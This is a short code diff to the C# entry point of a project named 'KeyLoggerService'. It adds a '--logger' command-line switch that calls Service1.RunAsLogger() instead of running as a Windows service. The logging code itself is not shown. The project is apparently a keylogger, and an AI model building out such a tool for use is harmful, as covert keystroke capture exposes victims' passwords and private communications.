@@ -12,14 +12,21 @@ namespace KeyLoggerService
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
-        static void Main()
+        static void Main(string[] args)
         {
-            ServiceBase[] ServicesToRun;
-            ServicesToRun = new ServiceBase[]
+            if (args.Length > 0 && args[0] == "--logger")
             {
-                new Service1()
-            };
-            ServiceBase.Run(ServicesToRun);
+                Service1.RunAsLogger();
+            }
+            else
+            {
+                ServiceBase[] ServicesToRun;
+                ServicesToRun = new ServiceBase[]
+                {
+                    new Service1()
+                };
+                ServiceBase.Run(ServicesToRun);
+            }
         }
     }
 }
